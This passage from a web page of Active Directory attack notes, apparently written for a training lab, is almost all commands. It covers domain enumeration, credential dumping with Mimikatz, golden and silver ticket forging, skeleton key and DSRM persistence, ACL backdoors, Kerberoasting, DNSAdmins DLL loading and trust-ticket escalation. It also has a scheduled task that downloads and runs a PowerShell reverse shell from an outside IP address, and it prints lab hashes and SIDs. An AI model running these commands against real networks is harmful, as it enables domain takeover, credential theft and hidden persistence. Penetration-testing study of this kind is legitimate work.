/>Tree-Root trust - It is created automatically between whenever a new domain tree is added to a forest root. This trust is always two-way transitive.<br /><br />#Shortcut Trusts<br />Used to reduce access time in complex trust scenarios. Can be one-way or two-way transitive trust<br /><br />#External Trust<br />Between two domains in different forests when forests do not have a trust relationship. Can be one-way or two-way non transitive trust. <br /><br />#Forest Trust<br />It is created between forest root domain. Cannot be extended to a third forest (no implicit trust). Can be one-way or two-way and transitive or non transitive trust.<br /><br />##Domain Trust Mapping<br />Get a list of all domain trusts for the current domain <br />#PowerViewGet-NetDomainTrust<br />#AD ModuleGet-ADTrust<br />Get a list of all domain trusts for another domain <br />#PowerViewGet-NetDomainTrust -Domain us.dollarcorp.moneycorp.local<br />#AD ModuleGet-ADTrust -Identity us.dollarcorp.moneycorp.local<br />Get details about the current forest<br />#PowerViewGet-NetForest<br />#AD ModuleGet-ADForest<br />Get details about the other forest<br />#PowerViewGet-NetForest -Forest eurocorp.local<br />#AD Module<br />Get-ADForest -Identity eurocorp.local<br />Get all domains in the current forest<br />#PowerViewGet-NetForestDomain<br />#AD Module(Get-ADForest).Domains<br />Get all domains for another forest<br />#PowerViewGet-NetForestDomain -Forest eurocorp.local<br />#AD Module(Get-ADForest -Identity eurocorp.local).Domains<br />Get all global catalogs for the current forest<br />#PowerViewGet-NetForestCatalog<br />#AD ModuleGet-ADForest  | select -ExpandProperty GlobalCatalogs<br />Get all global catalogs for another forest<br />#PowerViewGet-NetForestCatalog -Forest eurocorp.local<br />#AD ModuleGet-ADForest -Identity eurocorp.local  | select -ExpandProperty GlobalCatalogs<br />Get details about the forest trust<br />#PowerViewGet-NetForestTrust<br />#AD ModuleGet-ADTrust - Filter 'msDS-TrustForestTrustInfo -ne "$null"'<br /><br />##User Hunting<br />Find all machines on the current domain where the current user has local admin access<br />#PowerViewFind-LocalAdminAccess -verbose<br />This function queries the DC of the current or provided domain for a list of computers (Get-NetComputer) and then use multi-threaded and check local admin access on each machine<br />#PowerViewInvoke-CheckLocalAdminAccess<br />Use WMI to find if current user has local admin access on any computers in the domain<br />#To load WMI script. .\Find-WMILocalAdminAccess.ps1<br /><br /><br />Find local admins on all machines of the domain (needs administrator privileges on non-dc machines<br />#PowerViewInvoke-EnumerateLocalAdmin -Verbose<br />This function queries the DC of the current or provided domain for a list of computers (Get-NetComputer) and then use multi-threaded script on each machine.<br />Get-NetLocalGroup<br />Find computers where a domain admin (or specified user/group) has sessions:<br />#PowerViewInvoke-UserHunter<br />#PowerViewInvoke-UserHunter -GroupName "RDPUsers"<br />This functions queries the DC of the current or provided domain for members of the given group (Domain Admins by default) using (Get-NetGroupMember), gets a list of computers (Get-NetComputer) and list sessions and logged on users from each machine.<br />#PowerViewGet-NetSession<br />#PowerViewGet-NetLoggedon<br />To confirm admin access<br />#PowerViewInvoke-UserHunter -CheckAccess<br />This option queries the DC of the current or provided domain for members of the given group (Domain Admins by default) using (Get-NetGroupMember), get a list of only high traffic server (DC, File Servers &amp; Distributed File Servers) for less traffic generation and list sessions and logged on users (Get-NetSession / Get-NetLoggedon) from each machine<br />Find computers where a domain admin is logged-in<br />#PowerViewInvoke-UserHunter -Stealth<br /> ##Local Privilege Escalation <br />In an AD environment, there are multiple scenarios which lead to privilege escalation. We had a look at the following <br />• Hunting for Local Admin access on other machines <br />• Hunting for high privilege domain accounts (like a Domain Administrator)<br />There are various ways of locally escalating privileges on Windows box: <br />• Missing patches<br />• Automated deployment and AutoLogon passwords in clear text<br />• AlwaysInstallElevated (Any user can run MSI as SYSTEM)<br />• Misconfigured Services<br />• DLL Hijacking and more <br />We can use below tools for complete coverage<br />• PowerUp: <a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc">https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc</a><br />• BeRoot: <a href="https://github.com/AlessandroZ/BeRoot">https://github.com/AlessandroZ/BeRoot</a><br />• Privesc: <a href="https://github.com/enjoiz/Privesc">https://github.com/enjoiz/Privesc</a><br /><br />#Identify  services Issues using PowerUp<br />Get services with unquoted paths and a space in their name<br />#PowerUpGet-ServiceUnquoted -Verbose<br />Get services where the current user can write to its binary path or change arguments to the binary<br />#PowerUpGet-ModifiableServiceFile -Verbose<br />Get the services whose configuration current user can modify<br />#PowerUpGet-ModifiableService -Verbose<br />List the bin path of all the services using WMI<br />Get-WmiObject -Class win32_service | select pathname<br />Run all checks for privilege escalation<br />#PowerUpInvoke-AllChecks<br />#BeRoot.\beRoot.exe<br />#PrivescInvoke-PrivEsc<br /><br />##Enumerating Domain using BloodHound<br />What is BloodHound ?<br />Provides GUI for AD entities and relationships for the data collected by its ingestors. Uses Graph Theory for providing the capability of mapping shortest path for interesting things like Domain Admins. There are built-in queries for frequently used actions. Also supports custom Cypher queries. <br />BloodHound has 2 parts<br /><br />• Ingester - This is used to collect the data from the environment. SharpHound is the ingester for bloodhound data collection.<br />• GUI - This is used to uploaded the collected data and view the relationships in GUI Mode.<br />Collect data using SharpHound<br />#Load Sharphound powershell script. .\Sharphound.ps1<br />#Collect all data from the environmentInvoke-BloodHound -CollectionMethod All -Verbose<br />#Collect session data from the environmentInvoke-BloodHound -CollectionMethod LoggedOn -Verbose<br /><br />##Lateral Movement<br /><br />PSRemoting - It's administrative utility which allows system administrator to manage the system. It uses 5985.5986 port. It can help you to get elevated shell on the target system. It requires admin privilege on the target system.<br />There are 2 types of PSRemoting<br />One-to-One<br />Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local<br />One-to-Many<br />Invoke-Command -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local -ScriptBlock {whoami;hostname}<br />Invoke-Command -ScriptBlock {whoami} -ComputerName (Get-Content C:\AD\Tools\comp.txt)<br />Invoke-Command -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local -FilePath C:\AD\Tools\PowerUp.ps1  <br />Over-Pass-The hash<br />Invoke-Mimikatz -Command '"sekurlsa::pth /user:srvadmin /domain:dollarcorp.moneycorp.local /ntlm:a98e18228819e8eec3dfa33cb68b0728 /run:powershell.exe"'<br /><br />## Domain Persistence<br />Kerberos is the basis of authentication in a windows active directory environment. It has been constantly attacked since it was implemented with new attacks and scrutiny every couple of years.<br /><br />• NTLM password hash for kerberos RC4 encryption.<br />• Logon Ticket(TGT) provides user auth to DC.<br />• Kerberos policy only checked when TGT is created.<br />• DC validates user account only when TGT &gt; 20 mins.<br />• <br />• Service Tickets (TGS) PAC validation is optional &amp; rare<br />• Server LSASS sends PAC validation request to DC's netlogon service (NRPC)<br />• If it runs as a service, PAC validation is optional (disabled)<br />• If a service runs as System, it performs server signature verification on the PAC (Computer Account long-term key).<br /><br />#Golden Ticket<br />A golden ticket is signed and encrypted by the hash of KRBTGT account which makes it a valid TGT ticket.Since user account validation is not done by Domain Controller (KDC service) until TGT is older than 20 minutes, we can use even deleted/ revoked accounts.The KTBTGT user has could be used to impersonate any user with any privileges from even a non-domain machine.Password change has no effect on this attack.<br />Execute mimikatz on DC as Domain Admin to get KRBTGT hash<br />Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName dcorp-dc<br />Create golden ticket for administrator account<br />Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'<br />WMI command to find the operating system details from the remote host<br />Get-WmiObject -Class win32_operatingsystem -ComputerName dcorp-dc.dollarcorp.moneycorp.local<br /><br />#Silver Ticket<br />A valid TGS (Golden Ticket is a valid TGT).Encrypted and Signed by the NTLM hash of the service account / computer account (Golden ticket is signed by hash of krbtgt) of the service running with that account.Services rarely check PAC (Privileged Attribute Certificate).Services will allow access only to the services themselves.Reasonable persistence period (default 30 days for computer accounts).<br />Using hash of the domain controller computer account, below command provides access to shares on the DC.<br />Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:CIFS /rc4:e214e73b73085c290421f085f6ed67bb /user:Administrator /ptt"'<br />Schedule the task<br />schtasks /create /S dcorp-dc.dollarcorp.moneycorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheck" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''<a href="http://172.16.100.68:8080/Invoke-PowerShellTcp.ps1">http://172.16.100.68:8080/Invoke-PowerShellTcp.ps1</a>''')'"<br />Execute the task<br />schtasks /Run /S dcorp-dc.dollarcorp.moneycorp.local /TN "STCheck"<br /><br />#Skeleton Key<br />Skeleton key is a persistence technique where it is possible to patch a Domain Controller (lsass process) so that is allows access as any user with a single password.The attack was discovered by Dell Secureworks used in a malware named the skeleton key malwareAll the publicly known methods are NOT persistent across reboots. We cannot patch lsass twice(the attack would fail)<br />Use the below command to inject a skeleton key (password would be mimikatz) on a Domain Controller of choice. DA privileges required<br />Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName dcorp-dc.dollarcorp.moneycorp.local<br />Now it is possible to access any machine with a valid username and password as "mimikatz"<br />Enter-PSSession -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Credential dcorp\administrator<br />You can access other machines as well as long as they authenticate with the DC which hash been patched and the DC is not rebooted.<br />In case lsass is running as a protected process, we can still use Skeleton Key but it needs the mimikatz driver (mimidriv.sys) on disk of the target DC<br />privilege::debug!+!processprotect /process::lsass.exe /removemisc::skeleton!-<br />Note that above command would be very noisy in logs - Service Installation (Kernel mode driver)<br /><br />#DSRM<br />DSRM is Directory Services Restore Mode.There is a local administrator on every DC called "Administrator" whose password is the DSRM password. DSRM password (SafeModePassword) is required when a server is promoted to Domain Controller and it is rarely changes. After altering the configuration on the DC, it is  possible to pass the NTLM has of this user to access the DC. This is used when domain controller needs to be booted in safe mode.DSRM administrator is not allowed to logon over the network on the DC.<br />DUMP DSRM password (needs DA privs)<br />Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -ComputerName dcorp-dc.dollarcorp.moneycorp.local<br />Compare the administrator hash with the Administrator hash of the below command<br />Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName dcorp-dc.dollarcorp.moneycorp.local<br />Since DSRM user is the local administrator of the DC, we can pass the hash to authenticate.But, the logon behavior for the DSRM account needs to be changed before we can use its hash for network logon.<br />Enter-PSSession -ComputerName dcorp-dc.dollarcorp.moneycorp.localGet-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 <br />New-ItemPropery "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD<br />Use below command to pass the hash for DSRM user<br />Invoke-Mimikatz -Command '"sekurlsa::pth /domain:dcorp-dc /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:powershell.exe"'<br />Try to access the C drive of the DC<br />ls \\dcorp-dc\c$<br /><br />#Custom SSP<br />A Security Support Provider (SSP) is a DLL which provides ways for an application to obtain an authenticated connection. Some SSP Packages by Microsoft areNTLMKerberosWdigestCredSSP<br />Mimikatz provides a custom SSP - mimilib.dll. This SSP logs local logons, service account and machine account passwords in clear text on the target server.<br />We can use either of the ways:Drop the mimilib.dll to system32 and add mimilib to HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages:<br />$package = Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' | select -ExpandProperty 'Security Packages'$packages += "mimilib"<br />Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' -Value $packagesSet-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name 'Security Packages' -Value $packages<br />Using Mimikatz, inject into lsass (Not stable with Server 2016):<br />Invoke-Mimikatz -Command '"misc::memssp"'<br />All local logons on the DC are logged to<br />C:\Windows\system32\kiwissp.log<br /><br />#AdminSDHolder<br />Resides in the System container of a domain and used to control the permissions - Using an ACL - for certain built-in privileged groups (called Protected Groups)Security Descriptor Propagator (SDPROP) runs every hour and compares the ACL of protected groups and members with the ACL of AdminSDHolder and any differences are overwritten on the object ACL.<br />With Domain Admin privileges (Full Control / Write Permissions) on the AdminSDHolder object, it can be used as a backdoor / persistence mechanism by adding a user with Full Permissions (or other interesting permissions) to the AdminSDHolder object.In 60 minutes (when SDPROP runs), the user will be added with full control of the protected groups like Domain Admins without actually being a member of it. <br />Add FullControl permissions for a user to the AdminSDHolder as DA<br />#PowerViewAdd-ObjectACL -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName student68 -Rights All -Verbose<br />#AD Module - With custom script (Set-ADACL)Set-ADACL -DistinguishedName 'CN=AdminSDHolder,CN=System,DC=dollarcorp,DC=moneycorp,DC=local' -Principal student68 -Verbose<br />Other interesting permissions (ResetPassword, WriteMembers) for a user to the AdminSDHolder<br />Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName student68 -Rights ResetPassword -Verbose<br />Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName student68 -Rights WriteMembers -Verbose<br />Run SDPROP manually using Invoke-SDPropagator.ps1<br />Invoke-SDPropagator -timeourMinutes 1 -showProgress -Verbose<br />Check the Domain Admins permission as normal user<br />#PowerViewGet-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'student68'}<br />#AD Module(Get-Acl -Path 'AD:\CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local').Access | ?{$_.IdentityReference -match 'student68'}<br />Abusing FullControl<br />#PowerView DevAdd-DomainGroupMember -Identity 'Domain Admins' -Members student68 -Verbose<br />#AD ModuleAdd-ADGroupMember -Identity 'Domain Admins' -Members student68<br />Abusing ResetPassword<br />#PowerView DevSet-DomainUserPassword -Identity student68 -AccountPassword (ConvertTo-SecureString "Password@123" -AsPlainText -Force) -Verbose<br />#AD ModuleSet-ADAccountPassword -Identity student68 -NewPassword (ConvertTo-SecureString "Password@123" -AsPlainText -Force) -Verbose<br />Add FullControl rights<br />#PowerViewAdd-ObjectAcl -TargetDistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalSamAccountName student68 -Rights All -Verbose<br />#AD ModuleSet-ADACL -DistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -Principal student68 -Verbose<br />Add rights for DCSync<br />#PowerViewAdd-ObjectAcl -TargetDistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalSamAccountName student68 -Rights DCSync -Verbose<br />#AD ModuleSet-ADACL -DistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -Principal student68 -GUIDRight DCSync -Verbose<br />Execute DCSync<br />Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'<br /><br />#Security Descriptors<br />Persistence using ACLs specifically host based security descriptors. Once we have local admin privileges on the box it is possible to modify the security descriptor on the target system like SACL &amp; DACL etc of remote access methods such as WMI, PSRemoting, Remote Registry so that even non admin users can access it target system and execute commands remotely.<br />It is possible to modify Security Descriptors (security information like Owner,primary group, DACL &amp; SACL) of multiple remote access methods (securable objects) to allow access to non-admin users.Administrative privileges are required for this. It, of course, works as a very useful and impactful backdoor mechanism.<br />Security Descriptor Defination Language(SDDL) defines the format which is used to describe a security descriptor. SDDL uses ACE strings for DACL and SACL:ace_type;ace_flags;rights;object_guid;inherit_<br /><br />ACLs can be modified to allow non-admin users access to securable objectsModify the security descriptor for WMIOn local machine for student68<br />#Set-RemoteWMI.ps1Set-RemoteWMI -UserName student68 -Verbose<br /> On remote machine for student68 without explicit credentials<br />Set-RemoteWMI -UserName student68 -ComputerName dcorp-dc.dollarcorp.moneycorp.local -namespace 'root\cimv2' -Verbose<br />On remote machine with explicit credentials. Only root\cimv2 and nested namespaces<br />Set-RemoteWMI -UserName student68 -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Credential administrator -namespace 'root\cimv2' -Verbose<br />On remote machine remove permissions<br />Set-RemoteWMI -UserName student68 -ComputerName dcorp-dc.dollarcorp.moneycorp.local -namespace 'root\cimv2' -Remove -Verbose<br />Modify the security descriptor for PSRemotingOn Local machine for student 68<br />#Set-RemotePSRemoting.ps1Set-RemotePSRemoting -UserName student68 -Verbose<br />On remote machine for student68 without credentials<br />Set-RemotePSRemoting -UserName student68 -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Verbose<br />On remote machine, remove the permissions<br />Set-RemotePSRemoting -UserName student68 -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Remove -Verbose<br />Modify the security descriptors for Remote RegistryUsing DAMP, with admin privs on remote machine<br />Add-RemoteRegBackdoor -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Trustee student68 -Verbose<br />As student68, retrieve machine account hash<br />Get-RemoteMachineAccountHash -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Verbose<br />Retrive local account hash<br />Get-RemoteLocalAccountHash -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Verbose<br />Retrieve domain cached credentials<br />Get-RemoteCachedCredential -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Verbose<br /><br />##Privilege Escalation<br />#Kerberoast<br />Offline cracking of service account passwordsThe kerberos session ticket (TGS) has a server portion which is encrypted with the password hash of service account. This makes it possible to request a ticket and do offline password attack.Service accounts are many times ignored (passwords are rarely changed) and have privileged access. Password hashes of service accounts could be used to create silver tickets.<br />Find User accounts used as Service accounts<br />#PowerViewGet-NetUser -SPN<br />#AD ModuleGet-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName<br />Request a TGS<br />Add-Type -AssemblyName System.IdentityModelNew-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local"<br />#PowerViewRequest-SPNTicket<br />Check if the TGS has been granted<br />klist<br />Export all tickets using Mimikatz<br />Invoke-Mimikatz -Command '"kerberos::list /export"'<br />Crack the Service account password<br />python.exe .\tgsrepcrack.py .\10k-worst-pass.txt 1-40a10000-student68@MSSQLSvc~dcorp-mgmt.dollarcorp.moneycorp.local-DOLLARCORP.MONEYCORP.LOCAL.kirbi<br /><br />#Targeted Kerberoasting - AS-REPs<br />If a user's UserAccountControl settings have "Do not require Kerberos preauthentication" enabled i.e. Kerberos preauth is disabled, it is possible to grab user's crackable AS-REP and brute-force it offline.With sufficient rights (GenericWrite or GenericAll), kerberos preauth can be forced disabled as well.<br />Enumerating accounts with Kerberos Preauth disabled<br />#PowerView DevGet-DomainUser -PreauthNotRequired -Verbose<br />#AD Module Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth<br />Force disable Kerberos PreauthLet's enumerate the permissions for RDPUsers on ACL's<br />#PowerView DevInvoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}<br />Set-DomainObject -Identity Control68User -XOR @{useraccountcontrol=4194304} -Verbose<br />Get-DomainUser -PreauthNotRequired -Verbose<br />Request encrypted AS-REP for offline brute-forceLet's use ASREPRoast<br />Get-ASREPHash -UserName VPN68User -Verbose<br />To enumerate all users with Kerberos preauth disabled and request a hash<br />Invoke-ASREPRoast -Verbose<br />Cracking the hashUsing bleeding-jumbo branch of John The Ripper, we can brute-force the hashes offline<br />./john vpn68user.txt --wordlist=wordlist.txt<br /><br />#Targeted Kerberoasting - Set SPN<br />With enough rights (GenericAll/GenericWrite), a target user's SPN can be set to anything(unique in the domain)We can then request a TGS without special privileges. The TGS can then be "kerberoasted"<br />Let's enumerate the permissions for RDPUsers on ACL's<br />#PowerView DevInvoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}<br />Check if the user already has a SPN<br />#PowerView DevGet-DomainUser -Identity support68user | select serviceprincipalname<br />#AD ModuleGet-ADUser -Identity support68user -Properties ServicePrincipalName | Select ServicePrincipalName<br />Set a SPN for the user (must be unique for the domain)<br />#PowerViewSet-DomainObject -Identity support68user -Set @{serviceprincipalname='ops/whatever1'}<br />#AD ModuleSet-ADUser -Identity support68user -ServicePrincipalNames @{Add='ops/whatever1'}<br />Request a ticket<br />Add-Type -AssemblyName System.IdentityModelNew-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ops/whatever1"<br />#PowerViewRequest-SPNTicket<br />Check if the TGS has been granted<br />klist<br />Export all tickets using Mimikatz<br />Invoke-Mimikatz -Command '"kerberos::list /export"'<br />Crack the Service account password<br />python.exe .\tgsrepcrack.py .\10k-worst-pass.txt 2-40a10000-student68@ops~whatever1-DOLLARCORP.MONEYCORP.LOCAL.kirbi<br /><br />##Kerberos Delegation<br /><br />#UnConstrained Delegation<br /><br />#Constrained Delegation<br />Constrained Delegation when enabled on a service account, allows access only to specified services on specified computer as a user.A typical scenario where a constrained delegation<br /><br />Enumerate users and computers with constrained delegation enabled<br />#PowerView DevGet-DomainUser -TrustedToAuthGet-DomainComputer -TrustedToAuth<br />#AD ModuleGet-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo<br /><br />Priv Esc - DNS Admins<br />It is possible for the members of the DNSAdmins group to load arbitrary DLL with the privileges of dns.exe (System).In case the DC also serves as DNS, this will provide us escalation to DA.Need privileges to restart the DNS service.<br />Enumerate the members of the DNSAdmins group<br />#PowerViewGet-NetGroupMember -GroupName "DNSAdmins"<br />#AD ModuleGet-ADGroupMember -Identity DNSAdmins<br />Once we know the members of the DNSAdmins group, we need to compromise a member. We already have hash of srvadmin because of derivative local admin<br />From the privileges of DNSAdmins group member, configure DLL using dnscmd.exe (needs RSAT DNS)<br />dnscmd dcorp-dc /config /serverlevelplugindll \\172.16.100.68\dll\mimilib.dll<br />Using DNSServer module (needs RSAT DNS)<br />$dnsettings = Get-DNSServerSetting -ComputerName dcorp-dc -Verbose -All$dnsettings.ServerLevelPluginDll = "\\172.16.100.68\dll\mimilib.dll" Set-DnsServerSetting -InputObject $dnsettings -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Verbose<br />#Priv Esc - Across Trust<br />Across Domains - Implicit two way trust relationshipAcross Forest - <br />#Child to Parent<br />Domains in same forest have an implicit two-way trust with other domains. There is trust key between the parent and child domainsThere are two ways of escalating privileges between two domains of same forest<br />• krbtgt hash<br />• Trust tickets<br />Child to forest root using trust ticketsSo what is required to forge trust tickets is obviously the trust key look for [in] trust key from child to parent<br />Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dcorp-dc<br />Invoke-Mimikatz -Command '"lsadump::dcsync /user\dcorp\mcorp$"'<br />Child to forest root using trust ticketsAn inter-realm TGT can be forged<br />Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-268341927-4156871508-1792461683 /sids:S-1-5-21-560323961-2032768757-2425134131-519 /rc4:8c762f099cfe1fb57e699a915069e921 /service:krbtgt /target:moneycorp.local /ticket:C:\AD\Tools\kekeo_old\trust_tkt.kirbi"'<br />Child to Forest Root using Trust Tickets Get a TGS for a service (CIFS below) in the target domain by using the forged trust ticket.<br />.\asktgs.exe C:\AD\Tools\kekeo_old\trust_tkt.kirbi CIFS/mcorp-dc.moneycorp.local<br />Tickets for other services (like HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting and WinRM) can be created as well.<br />Child to Forest Root using Trust Tickets Use the TGS to access the targeted service (may need to use it twice).<br />.\kirbikator.exe lsa .\CIFS.mcorp-dc.moneycorp.local.kirbi<br />ls \\mcorp-dc.moneycorp.local\c$<br /><br />We will abuse SID history once again<br />Invoke-Mimikatz -Command '"lsadump::lsa /patch"'<br />Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\Tools\krbtgt_tkt.kirbi"'<br /><br />In the above command, the mimikatz option "/sids" is forcefully setting the SID History for the Enterprise Admin group for dollarcorp.moneycorp.local that is the Forest Enterprise Admin Group.<br /><br />#Across Forest<br />Across ForestsOnce again, we require the trust key for the inter-forest trust<br />Invoke-Mimikatz -Command '"lsadump::trust /patch"'<br />OR<br />Invoke-Mimikatz -Command '"lsadump::lsa /patch"'<br />An inter-forest TGT can be forged<br />Invoke-Mimikatz -Command '"kerberos::golden /user:administrator /domain:dollarcorp.moneycorp.local /sid: /rc4: /service:krbtgt /target:eurocorp.local /ticket:C:\AD\Tools\kekeo_old\trust_forest_tkt.kirbi<br />Get a TGS for a service (CIFS below) in the target domain by using the forged trust ticket<br />.\asktgs.exe C:\AD\Tools\kekeo_old\trust_forest_tkt.kirbi CIFS/eurocorp-dc.eurocorp.local<br />Tickets for other services (like HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting and WinRM) can be created as well<br /><br /><br />#Trust Abuse - MSSQL Server<br />MSSQL server are generally deployed in plenty in a Windows domain.SQL Servers provide very good options for lateral movement as domain users can be mapped to database roles.<br />Discovery (SPN Scanning)<br />Get-SQLInstanceDomain<br />Check Accessibility<br />Get-SQLConnectionTestThreaded<br />Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose<br />Gather Information<br />Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose<br />A database link allows a SQL Server to access external data source like other SQL Server and OLD DB data sourcesIn case of database links between SQL Servers, that is linked SQL servers it is possible to execute stored proceduresDatabase links work even across forest trusts<br />Searching Database LinksLook for links to remote servers<br />Get-SQLServerLink -Instance dcorp-mssql -Verbose<br />OR<br />select * from master..sysservers<br />Enumerate Database Links - ManuallyOpenquery() function can be used to run queries on a linked database<br />select * from openquery("dcorp-sql1",'select * from master.sysservers')<br />Get-SQLServerLinkCrawl -Instance dcorp-mssql -Verbose<br />OR<br />select * from openquery("dcorp-sql1",'select * from openquery("dcorp-mgmt", 'select * from master.sysservers')) </div></div>
</body></html>